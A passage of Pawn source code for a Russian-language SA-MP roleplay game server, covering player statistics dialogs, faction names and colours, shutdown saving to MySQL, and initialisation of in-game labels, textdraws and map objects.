			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tТесорреро\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tНестро\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПадре\n");
			}
		}
	case 5:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tНовичок\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tАссосиато\n");
			case 3: format(tempstring,sizeof(tempstring),"Должность:\t\tСомбаттенте\n");
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСолдато\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tБоец\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСото-капо\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКапо\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМладший Босс\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tКоньсельери\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tДон\n");
			}
		}
	case 4,22,33:
		{
			switch(PlayerInfo[targetid][pRank])
			{
			case 1: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tИнтерн\n");
			case 2: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСанитар\n");
			case 3:
				{
					if(PlayerInfo[targetid][pSex] == 1) format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМед.Брат\n");
					else if(PlayerInfo[targetid][pSex] == 2) format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tМед.Сестра\n");
				}
			case 4: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tСпасатель\n");
			case 5: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tНарколог\n");
			case 6: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tДоктор\n");
			case 7: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tПсихолог\n");
			case 8: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tХирург\n");
			case 9: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tЗам Глав.Врача\n");
			case 10: format(tempstring,sizeof(tempstring),"Должность:\t\t\t\tГлав.Врач\n");
			}
		}
	}
	strcat(httpquery,tempstring);

	switch(PlayerInfo[targetid][pJob])
	{
	case 0: format(tempstring,sizeof(tempstring),"Работа:\t\t\tБезработный\n");
	case 1: format(tempstring,sizeof(tempstring),"Работа:\t\t\tВодитель автобуса\n");
	case 2: format(tempstring,sizeof(tempstring),"Работа:\t\t\tМеханик\n");
	case 3: format(tempstring,sizeof(tempstring),"Работа:\t\t\tПродавец хотдогов\n");
	case 4: format(tempstring,sizeof(tempstring),"Работа:\t\t\tТаксист\n");
	case 5: format(tempstring,sizeof(tempstring),"Работа:\t\t\tРазвозчик продуктов\n");
	case 6: format(tempstring,sizeof(tempstring),"Работа:\t\t\tТренер\n");
	case 8: format(tempstring,sizeof(tempstring),"Работа:\t\t\tИнкассатор\n");
	case 9: format(tempstring,sizeof(tempstring),"Работа:\t\t\tПрораб\n");
	case 99: format(tempstring,sizeof(tempstring),"Работа:\t\t\tДальнобойщик\n");
	}
	strcat(httpquery,tempstring);

	switch(PlayerInfo[targetid][pDonateRank])
	{
	case 0:
		{
			switch(PlayerInfo[targetid][pLevel])
			{
			case 1: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tНовичок\n");
			case 2,3: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tОсвоившийся\n");
			case 4,5: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tОсвоившийся\n");
			case 10: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tПостоянный игрок\n");
			case 6,7,8,9: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tОсвоившийся\n");
			default: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tДед\n");
			}
		}
	case 1: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tBRONZE VIP\n");
	case 2: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tSILVER VIP\n");
	case 3: format(tempstring,sizeof(tempstring),"Статус:\t\t\t\tGOLD VIP\n");
	}
	strcat(httpquery,tempstring);

	format(tempstring,sizeof(tempstring),"Жена/Муж:\t\t\t%s\n",PlayerInfo[targetid][pMarriedTo]);
	strcat(httpquery,tempstring);

	if(PlayerInfo[targetid][pSex]==1)format(tempstring,sizeof(tempstring),"Пол:\t\t\t\tМужчина\n");
	else format(tempstring,sizeof(tempstring),"Пол:\t\t\t\tЖенщина\n");
	strcat(httpquery,tempstring);


	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		format(tempstring,sizeof(tempstring),"\n\nБанк:\t\t\t\t%d\n",PlayerInfo[targetid][pBank]);
		strcat(httpquery,tempstring);
		format(tempstring,sizeof(tempstring),"Дом:\t\t\t\t%d\n",PlayerInfo[targetid][pPHouseKey]);
		strcat(httpquery,tempstring);
		format(tempstring,sizeof(tempstring),"Бизнес:\t\t\t%d\n",PlayerInfo[targetid][pPBizzKey]);
		strcat(httpquery,tempstring);
		format(tempstring,sizeof(tempstring),"Квартира:\t\t\t%d\n",PlayerInfo[targetid][pKvartiraKey]);
		strcat(httpquery,tempstring);
		format(tempstring,sizeof(tempstring),"Скин:\t\t\t\t%d\n",PlayerInfo[targetid][pChar]);
		strcat(httpquery,tempstring);
		format(tempstring,sizeof(tempstring),"СкинФр:\t\t\t%d\n",PlayerInfo[targetid][pModel]);
		strcat(httpquery,tempstring);

	}
	ShowPlayerDialogEx(playerid,9999,0,"Статистика персонажа",httpquery,"Готово","");
	return 1;
}
stock GetFracName(i)
{
	new ttext[32];
    switch(i)
	{
	case 1: ttext = "Police LS";
	case 2: ttext = "FBI";
	case 3: ttext = "Army SF";
	case 4: ttext = "Медики";
	case 5: ttext = "La Cosa Nostra";
	case 6: ttext = "Yakuza";
	case 7: ttext = "Мэрия";
	case 8: ttext = "Casino";
	case 9: ttext = "News SF";
	case 10: ttext = "Police SF";
	case 11: ttext = "Автошкола";
	case 12: ttext = "Ballas Gang";
	case 13: ttext = "Vagos Gang";
	case 14: ttext = "Русская Мафия";
	case 15: ttext = "Grove Street";
	case 16: ttext = "News LS";
	case 17: ttext = "Aztecas Gang";
	case 18: ttext = "Rifa Gang";
	case 19: ttext = "Army LV";
	case 20: ttext = "News LV";
	case 21: ttext = "Police LV";
	case 24: ttext = "Hell's Angels MC";
	case 26: ttext = "Warlocks MC";
	case 29: ttext = "Pagans MC";
	default: ttext = "Нет";
	}
	return ttext;
}
stock ShowStats(playerid,targetid)
{
	if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new atext[32];
		new jtext[20];
		new drank[20];
		switch(PlayerInfo[targetid][pSex])
		{
		case 1: atext = "Мужчина";
		default: atext = "Женщина";
		}
		
		switch(PlayerInfo[targetid][pJob])
		{
		case 1: jtext = "Водитель автобуса";
		case 2: jtext = "Механик";
		case 3: jtext = "Продавец хотдогов";
		case 4: jtext = "Таксист";
		case 5: jtext = "Развозчик продуктов";
		case 6: jtext = "Тренер";
		case 8: jtext = "Инкассатор";
		case 9: jtext = "Прораб";
		case 99: jtext = "Дальнобойщик";
		default: jtext = "Нет";
		}
		switch(PlayerInfo[targetid][pDonateRank])
		{
		case 1: drank = "BRONZE";
		case 2: drank = "SILVER";
		case 3: drank = "GOLD";
		default: drank = "Нет";
		}
		new marry[32];
		if(!strcmp(PlayerInfo[targetid][pMarriedTo], "NULL", true))
		{
		    marry = "-";
		}
		else format(marry, 32, "%s", PlayerInfo[targetid][pMarriedTo]);
		new name[MAX_PLAYER_NAME];
		new wdeaths = PlayerInfo[targetid][pWantedDeaths];
		new level = PlayerInfo[targetid][pLevel];
		new exp = PlayerInfo[targetid][pExp];
		new nxtlevel = PlayerInfo[targetid][pLevel]+1;
		new expamount = nxtlevel*levelexp;
		new pnumber = PlayerInfo[targetid][pPnumber];
		new warns = PlayerInfo[targetid][pWarns];
		new zakon = PlayerInfo[targetid][pZakonp];
		new addiction = PlayerInfo[targetid][pAddiction];
		new crimes = PlayerInfo[targetid][pCrimes];
		new arrests = PlayerInfo[targetid][pArrested];
		GetPlayerName(targetid, name, sizeof(name));
		new coordsstring[2400];
		new msg[] = "[0] Имя\t\t\t\t%s\n[1] Уровень\t\t\t%i\n[2] Exp\t\t\t\t%i/%i\n[3] VIP\t\t\t\t%s\n[4] Пол\t\t\t\t%s\n[5] Организация\t\t%s\n[6] Ранг\t\t\t\t%s\n[7] Работа\t\t\t%s\n[8] Жена/Муж\t\t\t%s\n[9] Телефон\t\t\t%i\n[10] Дата регистрации\t\t%s\n[11] Законопослушность\t%i\n[12] Преступлений\t\t%i\n[13] Арестов\t\t\t%i\n[14] Смертей в розыске\t%i\n[15] Зависимость\t\t%i\n[16] Варнов\t\t\t%i";
		format(coordsstring, 2400, msg, name,level,exp,expamount,drank,atext,GetFracName(PlayerInfo[playerid][pMember]),GetRank(targetid),jtext,marry,pnumber,PlayerInfo[targetid][pDataReg],zakon,crimes,arrests,wdeaths,addiction,warns);
		ShowPlayerDialogEx(playerid,10004,DIALOG_STYLE_LIST, "Статистика персонажа",coordsstring, "Выбрать", "Назад");
	}
	return true;
}
stock QuestStats(playerid,targetid)
{
	if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new gaatext[64];
		switch(PlayerInfo[playerid][pQuestL])
		{
		case 0: gaatext ="Нет";
		case 1: gaatext ="Гость";
		case 2: gaatext ="Трудоголик";
		}
		new aatext[256];
		switch(PlayerInfo[playerid][pQuestL])
		{
		case 0: aatext = "{E39C0E}[Завершенные линии]\n\t{FBB431}Гость\n\t{7F7E7B}Трудоголик\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование";
		case 1: aatext = "{E39C0E}[Завершенные линии]\n\t{7F7E7B}Гость\n\t{7F7E7B}Трудоголик\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование\n\t{7F7E7B}Тестирование";
		}
		new name[MAX_PLAYER_NAME];
		new Quest = PlayerInfo[playerid][pQuest];
		new QuestP = PlayerInfo[playerid][pQuestP];
		new QuestF = PlayerInfo[playerid][pQuestF];
		new QuestPF = PlayerInfo[playerid][pQuestPF];
		GetPlayerName(targetid, name, sizeof(name));
		new coordsstring[1200];
		new msg[] = "{E09A18}===============================\n\t{FFFFFF}Имя: {FBB431}%s\n{E09A18}===============================\n\n{E39C0E}[Выполняется]\n\t{FFFFFF}С.линия: {FBB431}%s\n\t{FFFFFF}Квест: {FBB431}%d / %d\n\t{FFFFFF}Прогресс: {FBB431}%d / %d\n\n%s\n{E09A18}===============================";
		format(coordsstring, 1000, msg, name,gaatext,Quest,QuestF,QuestP,QuestPF,aatext);
		ShowPlayerDialogEx(playerid,10005,DIALOG_STYLE_MSGBOX, "Статистика",coordsstring, "Готово", "");
	}
	return true;
}
publics: SetPlayerToTeamColor(playerid)
{
	switch(PlayerInfo[playerid][pMember])
	{
	case 0:	SetPlayerColor(playerid, TEAM_HIT_COLOR);
	case 1: SetPlayerColor(playerid, 0x110CE7FF);
	case 2: SetPlayerColor(playerid, 0x313131AA);
	case 3: SetPlayerColor(playerid, COLOR_GREEN);
	case 4: SetPlayerColor(playerid, 0x954F4FFF);
	case 5: SetPlayerColor(playerid, 0xDDA701FF);
	case 6: SetPlayerColor(playerid, COLOR_REDD);
	case 7: SetPlayerColor(playerid, 0x114D71FF);
	case 8: SetPlayerColor(playerid, 0xB313E7FF);
	case 9: SetPlayerColor(playerid, 0x49E789FF);
	case 10: SetPlayerColor(playerid, 0x110CE7FF);
	case 11: SetPlayerColor(playerid, 0x139BECFF);
	case 12: SetPlayerColor(playerid, 0xB313E7FF);
	case 13: SetPlayerColor(playerid, 0xDBD604AA);
	case 14: SetPlayerColor(playerid, COLOR_GRAD1);
	case 15: SetPlayerColor(playerid, 0x009F00AA);
	case 16: SetPlayerColor(playerid, 0x40848BAA);
	case 17: SetPlayerColor(playerid, TEAM_AZTECAS_COLOR);
	case 18: SetPlayerColor(playerid, 0x2A9170FF);
	case 19: SetPlayerColor(playerid, COLOR_GREEN);
	case 20: SetPlayerColor(playerid, 0xE6284EFF);
	case 21: SetPlayerColor(playerid, 0x110CE7FF);
	case 22: SetPlayerColor(playerid, 0x954F4FFF);
	case 23: SetPlayerColor(playerid, 0x9ED201FF);
	case 24: SetPlayerColor(playerid, 0xB30000FF);
	case 25: SetPlayerColor(playerid, 0x49E789FF);
	case 26: SetPlayerColor(playerid, 0xF45000FF);
	case 27: SetPlayerColor(playerid, 0xF45000FF);
	case 28: SetPlayerColor(playerid, 0xFFEE8AFF);
	case 29: SetPlayerColor(playerid, 0x114D71FF);
	case 30: SetPlayerColor(playerid, 0xE6284EFF);
	case 31: SetPlayerColor(playerid, 0xB30000FF);
	case 32: SetPlayerColor(playerid, 0xFF9DB6FF);
	case 33: SetPlayerColor(playerid, 0x954F4FFF);
	case 34: SetPlayerColor(playerid, 0x7df9ffFF);
	}
	return true;
}
publics: GameModeExitFunc()
{
	KillTimer(Hptimer);
	KillTimer(freshtimer);
	KillTimer(reklamatimer);
	GameModeExit();
	//	mysql_close(connectionHandle);
	return true;
}
public OnGameModeExit()
{
	SaveMySQL(0);
	for(new i = 1; i <= TOTALCASINO; i++) SaveMySQL(1,i);
	SaveMySQL(2);
	foreach(i) Kick(i);
	for(new i = 1; i <= TOTALSHOPS; i++) SaveMySQL(3,i);
	for(new i = 1; i <= TotalBizz; i++) SaveMySQL(4,i);
	for(new i = 1; i <= TotalHouse; i++) SaveMySQL(5,i);
	for(new i = 1; i <= ALLKVARTIRI; i++) SaveMySQL(6,i);
	for(new i = 1; i <= AllPODEZD; i++) SaveMySQL(7,i);
	for(new i = 1; i <= TOTALATM; i++) SaveMySQL(8,i);
	for(new i = 0; i <= TOTALFARM; i++) SaveMySQL(9,i);
	ClearReconnect();
	GameModeExitFunc();
    mysql_close(DATABASE);
	return true;
}
public OnGameModeInit()
{
	SendRconCommand("hostname "HostName"");
	SetGameModeText("Evolve-Rp "version"");
	new rand1 = random(2)+1;
	new rand2 = random(2)+1;
	new rand3 = random(2)+1;
	ZernBuy = 3+rand1;
	UrojSell = 33+rand2;
	NarkSell = 33+rand3;
    SendRconCommand("ackslimit 150000");
    for(new i = 0; i < MAX_VEHICLES; i++)
    {
		jobcar[i] = false;
	}
	BikerZoneCoords[0][zoneX1] = 1937.3152,BikerZoneCoords[0][zoneY1] = 2210.0862,BikerZoneCoords[0][zoneX2] = 2011.1254,BikerZoneCoords[0][zoneY2] = 2266.0305;
	BikerZoneCoords[1][zoneX1] = 808.8674,BikerZoneCoords[1][zoneY1] = -1160.4417,BikerZoneCoords[1][zoneX2] = 928.9384,BikerZoneCoords[1][zoneY2] = -1306.6891;
	BikerZoneCoords[2][zoneX1] = -1875.3832,BikerZoneCoords[2][zoneY1] = 1187.3928,BikerZoneCoords[2][zoneX2] = -1754.3665,BikerZoneCoords[2][zoneY2] = 1287.2761;
	for(new x = 0; x < 3; x++)
	BikerZone[x] = GangZoneCreate(BikerZoneCoords[x][zoneX1],BikerZoneCoords[x][zoneY1],BikerZoneCoords[x][zoneX2],BikerZoneCoords[x][zoneY2]);

	if(GetMaxPlayers() > 1000) return SendRconCommand("exit");
	for(new i = 1; i<MAX_PLAYERS; i++) Sonar[i] = random(2000);
	for(new i=0; i<MAX_PLAYERS; i++) strmid(ExitInfo[i][ExitIP],"None", 0, strlen("None"), 32), ExitInfo[i][ExitTime] = 0;
	exitpodeezd = CreateDynamicPickup(1318, 1, 2238.9285,-1192.6212,1033.7969, -1);
	podeezdils = CreatePickupAC(1318, 1, 2265.8848,1647.5061,1084.2344, -1);
	new strings[256];
	format(strings, sizeof(strings), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
	Doki[1] = Create3DTextLabel(strings, 0xFFFF00FF,-1731.4509,118.9413,3.5547,20.0,0,1);
	format(strings, sizeof(strings), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
	Doki[0] = Create3DTextLabel(strings, 0xFFFF00FF,2601.7222,-2226.5867,13.3732,20.0,0,1);
	format(strings, sizeof(strings), "Нефтезавод №1\nЦена за тонну: %d",Benzbuy[0]);
	GasZavod[0] = Create3DTextLabel(strings, 0xFFFF00FF,256.4736,1414.5182,10.7075,20.0,0,1);
	format(strings, sizeof(strings), "Нефтезавод №2\nЦена за тонну: %d",Benzbuy[1]);
	GasZavod[1] = Create3DTextLabel(strings, 0xFFFF00FF,-1046.7723,-670.7208,32.3516,20.0,0,1);
	format(strings, sizeof(strings), "Склад угля №1\nЦена за тонну: %d",ugolbuy[0]);
	Sklad[0] = Create3DTextLabel(strings, 0xFFFF00FF,608.7718,847.8765,-43.1532,20.0,0,1);
	format(strings, sizeof(strings), "Лесопилка №1\nЦена за тонну: %d",Buyderevo[0]);
	Derevobuy[0] = Create3DTextLabel(strings, 0xFFFF00FF,-449.3336,-65.9115,59.4158,20.0,0,1);
	format(strings, sizeof(strings), "Лесопилка №2\nЦена за тонну: %d",Buyderevo[1]);
	Derevobuy[1] = Create3DTextLabel(strings, 0xFFFF00FF,-1978.6846,-2434.8274,30.6250,20.0,0,1);
	format(strings, sizeof(strings), "Склад угля №2\nЦена за тонну: %d",ugolbuy[1]);
	Sklad[1] = Create3DTextLabel(strings, 0xFFFF00FF,-1873.0896,-1720.2430,21.7500,20.0,0,1);
	// Кости
	Bone[0] = TextDrawCreate(595.147888, 142.666656, "usebox");
	TextDrawLetterSize(Bone[0], 0.000000, 18.155559);
	TextDrawTextSize(Bone[0], 519.464111, 0.000000);
	TextDrawAlignment(Bone[0], 1);
	TextDrawColor(Bone[0], 0);
	TextDrawUseBox(Bone[0], true);
	TextDrawBoxColor(Bone[0], 1128481664);
	TextDrawSetShadow(Bone[0], 0);
	TextDrawSetOutline(Bone[0], 0);
	TextDrawBackgroundColor(Bone[0], -1751672960);
	TextDrawFont(Bone[0], 0);

	Bone[1] = TextDrawCreate(557.540405, 251.999969, "SET_BET");
	TextDrawLetterSize(Bone[1], 0.429852, 1.360828);
	TextDrawTextSize(Bone[1], 8.721603, 61.250003);
	TextDrawAlignment(Bone[1], 2);
	TextDrawColor(Bone[1], -1347440641);
	TextDrawUseBox(Bone[1], true);
	TextDrawBoxColor(Bone[1], 555819408);
	TextDrawSetShadow(Bone[1], 0);
	TextDrawSetOutline(Bone[1], 1);
	TextDrawBackgroundColor(Bone[1], 51);
	TextDrawFont(Bone[1], 3);
	TextDrawSetProportional(Bone[1], 1);
	TextDrawSetSelectable(Bone[1], true);

	Bone[2] = TextDrawCreate(557.540710, 270.666656, "DICE");
	TextDrawLetterSize(Bone[2], 0.429852, 1.360828);
	TextDrawTextSize(Bone[2], 8.721603, 61.250003);
	TextDrawAlignment(Bone[2], 2);
	TextDrawColor(Bone[2], -1347440641);
	TextDrawUseBox(Bone[2], true);
	TextDrawBoxColor(Bone[2], 555819392);
	TextDrawSetShadow(Bone[2], 0);
	TextDrawSetOutline(Bone[2], 1);
	TextDrawBackgroundColor(Bone[2], 51);
	TextDrawFont(Bone[2], 3);
	TextDrawSetProportional(Bone[2], 1);
	TextDrawSetSelectable(Bone[2], true);

	Bone[3] = TextDrawCreate(557.540283, 289.333312, "EXIT");
	TextDrawLetterSize(Bone[3], 0.429852, 1.360828);
	TextDrawTextSize(Bone[3], 8.721603, 61.250003);
	TextDrawAlignment(Bone[3], 2);
	TextDrawColor(Bone[3], -1347440641);
	TextDrawUseBox(Bone[3], true);
	TextDrawBoxColor(Bone[3], 555819392);
	TextDrawSetShadow(Bone[3], 0);
	TextDrawSetOutline(Bone[3], 1);
	TextDrawBackgroundColor(Bone[3], 51);
	TextDrawFont(Bone[3], 3);
	TextDrawSetProportional(Bone[3], 1);
	TextDrawSetSelectable(Bone[3], true);
	//
	for(new i; i < MAX_BONE; i++)
	{
		CreateDynamicObject(1824,BoneCoor[i][0],BoneCoor[i][1],BoneCoor[i][2],0,0,BoneCoor[i][3]);
		BoneInfo[i][Crupie] = INVALID_PLAYER_ID;
		for(new idx= 0; idx < 5; idx++) BoneInfo[i][Gamer][idx] = INVALID_PLAYER_ID;
		BoneInfo[i][GameStart] = 0;
	}
	for(new i = 0; i < MAX_ROULET; i++) RouletKrupie[i] = INVALID_PLAYER_ID;
    Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 2500);
	ShowPlayerMarkers(PLAYER_MARKERS_MODE_GLOBAL);
	ShowNameTags(1);
	AntiDeAMX2();
	AntiDeAMX();
	SetNameTagDrawDistance(30.0);
	EnableStuntBonusForAll(0);
	DisableInteriorEnterExits();
	new tmphour, tmpminute, tmpsecond;
	gettime(tmphour, tmpminute, tmpsecond);
	FixHour(tmphour);
	tmphour = shifthour;
	ghour = tmphour;
	SetWorldTime(tmphour);
	addd[0] = 5;
	addd[1] = 5;
	addd[2] = 5;
	licgate = CreateObject(968,-2074.50000000,-94.90000153,35.00000000,0.00000000,90.00000000,90.00000000);
	gruzgate = CreateObject(968,2203.8630371094,-2252.1179199219,13.5,0.00000000,270.00000000,316.00000000);
	Speed = TextDrawCreate(483.217968, 427.333312, "_");
	TextDrawLetterSize(Speed, 0.000000, -5.601846);
	TextDrawTextSize(Speed, 310.998535, 0.000000);
	TextDrawAlignment(Speed, 0);
	TextDrawColor(Speed, 0);
	TextDrawUseBox(Speed, true);
	TextDrawBoxColor(Speed, 102);
	TextDrawSetShadow(Speed, 0);
	TextDrawSetOutline(Speed, 0);
	TextDrawFont(Speed, 0);
	/*Speed = TextDrawCreate(533.000000, 393.000000, "____");
	TextDrawBackgroundColor(Speed, 255);
	TextDrawFont(Speed, 1);
	TextDrawLetterSize(Speed, 1.309998, 4.499999);
	TextDrawColor(Speed, -1);
	TextDrawSetOutline(Speed, 0);
	TextDrawSetProportional(Speed, 1);
	TextDrawSetShadow(Speed, 1);
	TextDrawUseBox(Speed, 1);
	TextDrawBoxColor(Speed, COLOR_BOX);
	TextDrawTextSize(Speed, 348.000000, 27.000000);*/
	BoxPanel = TextDrawCreate(352.000000, 356.000000, "_~n~_");
	TextDrawBackgroundColor(BoxPanel, 255);
	TextDrawFont(BoxPanel, 1);
	TextDrawLetterSize(BoxPanel, 0.500000, 1.000000);
	TextDrawColor(BoxPanel, 943208449);
	TextDrawSetOutline(BoxPanel, 0);
	//****//
    Logotip_TD[0] = TextDrawCreate(541.4661, -2.4296, "LD_BEAT:chit"); // пусто
  	TextDrawTextSize(Logotip_TD[0], 31.0000, 34.0000);
	TextDrawAlignment(Logotip_TD[0], 1);
	TextDrawColor(Logotip_TD[0], 0xAE433DFF);
	TextDrawBackgroundColor(Logotip_TD[0], 255);
	TextDrawFont(Logotip_TD[0], 4);
	TextDrawSetProportional(Logotip_TD[0], 0);
	TextDrawSetShadow(Logotip_TD[0], 0);

	Logotip_TD[1] = TextDrawCreate(551.6666, 2.9184, "1"); // пусто
	TextDrawLetterSize(Logotip_TD[1], 0.5376, 2.4047);
	TextDrawAlignment(Logotip_TD[1], 1);
	TextDrawColor(Logotip_TD[1], -1);
	TextDrawBackgroundColor(Logotip_TD[1], 30);
	TextDrawFont(Logotip_TD[1], 1);
	TextDrawSetProportional(Logotip_TD[1], 1);
	TextDrawSetShadow(Logotip_TD[1], 0);

	Logotip_TD[2] = TextDrawCreate(561.5332, 27.3777, "]"); // пусто
	TextDrawLetterSize(Logotip_TD[2], 0.1410, 0.6127);
	TextDrawAlignment(Logotip_TD[2], 1);
	TextDrawColor(Logotip_TD[2], -5963521);
	TextDrawBackgroundColor(Logotip_TD[2], 255);
	TextDrawFont(Logotip_TD[2], 2);
	TextDrawSetProportional(Logotip_TD[2], 1);
	TextDrawSetShadow(Logotip_TD[2], 0);

	Logotip_TD[3] = TextDrawCreate(564.5333, 19.9111, "]"); // пусто
	TextDrawLetterSize(Logotip_TD[3], 0.2063, 0.8782);
	TextDrawAlignment(Logotip_TD[3], 1);
	TextDrawColor(Logotip_TD[3], -5963521);
	TextDrawBackgroundColor(Logotip_TD[3], 255);
	TextDrawFont(Logotip_TD[3], 2);
	TextDrawSetProportional(Logotip_TD[3], 1);
	TextDrawSetShadow(Logotip_TD[3], 0);

	Logotip_TD[4] = TextDrawCreate(569.4002, 5.3777, "EVOLVE"); // пусто
	TextDrawLetterSize(Logotip_TD[4], 0.2153, 1.1395);
	TextDrawAlignment(Logotip_TD[4], 1);
	TextDrawColor(Logotip_TD[4], -1);
	TextDrawBackgroundColor(Logotip_TD[4], 1471368980);
	TextDrawFont(Logotip_TD[4], 2);
	TextDrawSetProportional(Logotip_TD[4], 1);
	TextDrawSetShadow(Logotip_TD[4], 0);

	Logotip_TD[5] = TextDrawCreate(569.6001, 13.7778, "ROLEPLAY"); // пусто
	TextDrawLetterSize(Logotip_TD[5], 0.1303, 0.8118);
	TextDrawAlignment(Logotip_TD[5], 1);
	TextDrawColor(Logotip_TD[5], -1);
	TextDrawBackgroundColor(Logotip_TD[5], 1471368980);
	TextDrawFont(Logotip_TD[5], 2);
	TextDrawSetProportional(Logotip_TD[5], 1);
	TextDrawSetShadow(Logotip_TD[5], 0);

	Logotip_TD[6] = TextDrawCreate(571.4332, 24.1444, "]"); // пусто
	TextDrawLetterSize(Logotip_TD[6], 0.1156, 0.5090);
	TextDrawAlignment(Logotip_TD[6], 1);
	TextDrawColor(Logotip_TD[6], -5963521);
	TextDrawBackgroundColor(Logotip_TD[6], 255);
	TextDrawFont(Logotip_TD[6], 2);
	TextDrawSetProportional(Logotip_TD[6], 1);
	TextDrawSetShadow(Logotip_TD[6], 0);

	Logotip_TD[7] = TextDrawCreate(573.5000, 25.1592, "Box"); // пусто
	TextDrawLetterSize(Logotip_TD[7], 0.0000, -0.4333);
	TextDrawTextSize(Logotip_TD[7], 596.0000, 0.0000);
	TextDrawAlignment(Logotip_TD[7], 1);
	TextDrawColor(Logotip_TD[7], -1);
	TextDrawUseBox(Logotip_TD[7], 1);
	TextDrawBoxColor(Logotip_TD[7], -5963521);
	TextDrawBackgroundColor(Logotip_TD[7], 255);
	TextDrawFont(Logotip_TD[7], 1);
	TextDrawSetProportional(Logotip_TD[7], 1);
	TextDrawSetShadow(Logotip_TD[7], 0);

	Logotip_TD[8] = TextDrawCreate(577.5000, 27.5629, "Box"); // пусто
	TextDrawLetterSize(Logotip_TD[8], 0.0000, -0.3000);
	TextDrawTextSize(Logotip_TD[8], 587.0000, 0.0000);
	TextDrawAlignment(Logotip_TD[8], 1);
	TextDrawColor(Logotip_TD[8], -1);
	TextDrawUseBox(Logotip_TD[8], 1);
	TextDrawBoxColor(Logotip_TD[8], -5963521);
	TextDrawBackgroundColor(Logotip_TD[8], 255);
	TextDrawFont(Logotip_TD[8], 1);
	TextDrawSetProportional(Logotip_TD[8], 1);
	TextDrawSetShadow(Logotip_TD[8], 0);

	Logotip_TD[9] = TextDrawCreate(568.6332, 31.6963, "Box"); // пусто
	TextDrawLetterSize(Logotip_TD[9], 0.0000, -0.3333);
	TextDrawTextSize(Logotip_TD[9], 575.8000, 0.0000);
	TextDrawAlignment(Logotip_TD[9], 1);
	TextDrawColor(Logotip_TD[9], -1);
	TextDrawUseBox(Logotip_TD[9], 1);
	TextDrawBoxColor(Logotip_TD[9], -5963521);
	TextDrawBackgroundColor(Logotip_TD[9], 255);
	TextDrawFont(Logotip_TD[9], 1);
	TextDrawSetProportional(Logotip_TD[9], 1);
	TextDrawSetShadow(Logotip_TD[9], 0);
	//****//
	Golod_TD[0] = TextDrawCreate(595.0003, 138.0756, "hud:radar_burgerShot");
	TextDrawTextSize(Golod_TD[0], 15.0000, 18.0000);
	TextDrawAlignment(Golod_TD[0], 1);
	TextDrawColor(Golod_TD[0], -1);
	TextDrawBackgroundColor(Golod_TD[0], 255);
	TextDrawFont(Golod_TD[0], 4);
	TextDrawSetProportional(Golod_TD[0], 0);
	TextDrawSetShadow(Golod_TD[0], 0);
	//****//
	CreateObject(1569,2648.10,1185.73,9.82,0,0,0);
	// Домик
	modernhouse[0] = CreateObject(19462, 231.84, 1028.48, 1081.11, 0, 0, 0); // down
 	modernhouse[1] = CreateObject(19443, 231.84, 1034.01, 1081.11, 0, 0, 0);
	modernhouse[2] = CreateObject(19443, 231.84, 1035.60, 1081.11, 0, 0, 0);
	modernhouse[3] = CreateObject(1753, 231.13, 1031.17, 1079.75, 0, 0, -90);
	modernhouse[4] = CreateObject(1754, 231.13, 1033.43, 1079.75, 0, 0, -90);
	modernhouse[5] = CreateObject(1754, 231.13, 1026.95, 1079.75, 0, 0, -90);
	modernhouse[6] = CreateObject(19462, 227.06, 1036.37, 1081.11, 0, 0, 90);
	modernhouse[7] = CreateObject(1754, 229.13, 1035.73, 1079.75, 0, 0, 0);
	modernhouse[8] = CreateObject(1754, 226.16, 1035.73, 1079.75, 0, 0, 0);
	modernhouse[9] = CreateObject(2256, 225.21, 1036.27, 1082.15, 0, 0, 0);
	modernhouse[10] = CreateObject(19825, 231.72, 1030.21, 1081.17, 0, 0, -90);
	
	modernhouse[11] = CreateObject(19462, 218.88, 1036.37, 1087.79, 0, 0, 90); // left
